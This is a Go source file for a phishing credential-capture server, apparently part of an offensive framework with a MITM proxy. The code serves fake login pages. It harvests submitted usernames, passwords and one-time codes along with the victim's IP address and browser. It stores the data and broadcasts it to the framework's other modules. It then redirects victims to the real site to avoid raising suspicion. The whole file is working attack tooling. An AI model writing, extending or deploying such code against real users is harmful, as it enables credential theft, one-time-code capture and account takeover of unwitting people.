package phish

import (
	"context"
	"fmt"
	"html"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/store"
)

// CaptureServer is an HTTP server that serves phishing pages and harvests
// submitted credentials. It also answers OPTIONS/health for proxying.
type CaptureServer struct {
	// Listen is the TCP address to bind, e.g. ":8081".
	Listen string
	// DB is the store where harvested credentials and events are recorded.
	DB *store.Store
	// Bus is the event bus; credentials are published on it when non-nil.
	Bus *events.Bus
	// Log is the optional slog logger used for credential notifications.
	Log *slog.Logger

	// srv is the running http.Server (nil until Start).
	srv *http.Server
	// routes is the registered handler mux shared with the MITM proxy.
	routes *http.ServeMux
}

// NewCaptureServer builds a capture server. Listen should include the port,
// e.g. ":8081".
func NewCaptureServer(listen string, db *store.Store, bus *events.Bus, log *slog.Logger) *CaptureServer {
	if listen == "" {
		// Fall back to the default capture port when the caller omits it.
		listen = ":8081"
	}
	s := &CaptureServer{Listen: listen, DB: db, Bus: bus, Log: log}
	s.routes = http.NewServeMux()
	// Phish pages live under /phish/<id>; everything else is uninteresting.
	s.routes.HandleFunc("/phish/", s.handlePhish)
	// /health answers for load balancers, proxies and orchestrators that
	// poll the capture listener for liveness.
	s.routes.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
	return s
}

// Handler returns the HTTP handler (used to mount the capture server inside a
// proxy listener or standalone).
func (s *CaptureServer) Handler() http.Handler {
	return s.routes
}

// Start launches the HTTP server.
func (s *CaptureServer) Start() error {
	s.srv = &http.Server{
		Addr:    s.Listen,
		Handler: s.routes,
		// Read/Write timeouts protect against slowloris-style clients and
		// keep a stuck template render from holding a connection forever.
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}
	ln, err := net.Listen("tcp", s.Listen)
	if err != nil {
		return fmt.Errorf("phish listen %s: %w", s.Listen, err)
	}
	// Serve in the background so Start returns once the listener is up; the
	// caller owns the goroutine's lifetime via Stop.
	go func() { _ = s.srv.Serve(ln) }()
	return nil
}

// Stop shuts the server down.
func (s *CaptureServer) Stop() {
	if s.srv != nil {
		// Give in-flight requests a short grace period to finish; Serve
		// returns after this window whether they completed or not.
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = s.srv.Shutdown(ctx)
		s.srv = nil
	}
}

// handlePhish routes /phish/<id> and /phish/<id>/submit.
func (s *CaptureServer) handlePhish(w http.ResponseWriter, r *http.Request) {
	// Strip the "/phish/" prefix and split off the optional trailing segment
	// ("submit") from the template id.
	path := strings.TrimPrefix(r.URL.Path, "/phish/")
	parts := strings.SplitN(path, "/", 2)
	id := NormalizeTemplateID(parts[0])

	// Never render an unknown id: return 404 instead of serving a half-baked
	// or attacker-influenced page body.
	if !IsKnownTemplate(id) {
		http.NotFound(w, r)
		return
	}

	submit := len(parts) == 2 && parts[1] == "submit"
	switch {
	case submit:
		s.capture(w, r, id)
	default:
		s.servePage(w, r, id)
	}
}

// servePage renders and writes the phishing login page for id.
func (s *CaptureServer) servePage(w http.ResponseWriter, r *http.Request, id string) {
	f := DefaultFields(id)
	// The form's action must point at this server's submit endpoint so the
	// victim's POST lands back here for harvesting.
	f.Action = phishAction(r, id)
	// The "orig" query parameter names where to send the victim after
	// capture; escape it so a hostile URL cannot inject HTML into the page.
	f.Orig = html.EscapeString(r.URL.Query().Get("orig"))
	if f.Orig == "" {
		f.Orig = ""
	}
	htmlOut, err := Render(id, f)
	if err != nil {
		// A render failure is a programming error (bad template data), not a
		// client problem; report 500 rather than crashing the process.
		http.Error(w, "template error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write([]byte(htmlOut))
}

// capture harvests the credentials from a submitted phishing form and records
// them everywhere the framework can report them.
func (s *CaptureServer) capture(w http.ResponseWriter, r *http.Request, id string) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad form", http.StatusBadRequest)
		return
	}
	// Tolerate the different field names real login forms use so one
	// template covers many sites.
	username := firstOf(r.Form, "username", "user", "email", "login")
	password := firstOf(r.Form, "password", "pass", "pwd")
	otp := firstOf(r.Form, "otp", "code", "token")
	orig := r.Form.Get("orig")

	cred := store.Cred{
		Service:  "phish",
		Username: username,
		Password: password,
		Extra:    otp,
		Host:     r.Host,
		VictimIP: clientIP(r),
		VictimUA: r.UserAgent(),
		Source:   "phish:" + id,
		Time:     time.Now(),
	}
	// Persist the credential and fan it out to the store log, the event bus
	// and the logger so every UI surface (REPL, reports, chained modules)
	// sees it.
	s.DB.AddCred(cred)
	msg := fmt.Sprintf("credential.phished (%s): %s / %s from %s", id, username, password, clientIP(r))
	s.DB.LogEvent(events.TopicCredPhished, msg)
	if s.Bus != nil {
		s.Bus.Emit(events.TopicCredPhished, cred)
	}
	if s.Log != nil {
		s.Log.Info("phished credential", "template", id, "victim", clientIP(r))
	}

	// Redirect the victim to the original login page so they believe the
	// attempt failed/worked and keep browsing (session stays alive).
	if orig == "" {
		// No original URL known: land them on the server root instead of
		// dropping the connection, which would raise suspicion.
		orig = "/"
	}
	http.Redirect(w, r, orig, http.StatusFound)
}

// phishAction builds the submission URL for a page request.
func phishAction(r *http.Request, id string) string {
	host := r.Host
	scheme := "http"
	if r.TLS != nil {
		// Serve the form over https when the page itself was fetched over
		// TLS so the victim's browser does not flag a mixed-content submit.
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s/phish/%s/submit", scheme, host, id)
}

// firstOf returns the first non-empty value among keys, in order. Forms from
// different templates name their fields differently; this makes the capture
// tolerant of all of them.
func firstOf(vals map[string][]string, keys ...string) string {
	for _, k := range keys {
		if vs, ok := vals[k]; ok && len(vs) > 0 && vs[0] != "" {
			return vs[0]
		}
	}
	return ""
}

// clientIP extracts the remote IP from X-Forwarded-For when proxied.
func clientIP(r *http.Request) string {
	// When a reverse proxy or the MITM proxy fronts the capture server, the
	// real client IP arrives in X-Forwarded-For. Take the FIRST entry: each
	// proxy appends its own address, so the first is the original client.
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		if i := strings.IndexByte(xff, ','); i > 0 {
			return strings.TrimSpace(xff[:i])
		}
		return strings.TrimSpace(xff)
	}
	// Direct connections: r.RemoteAddr is "ip:port"; keep only the host part.
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}
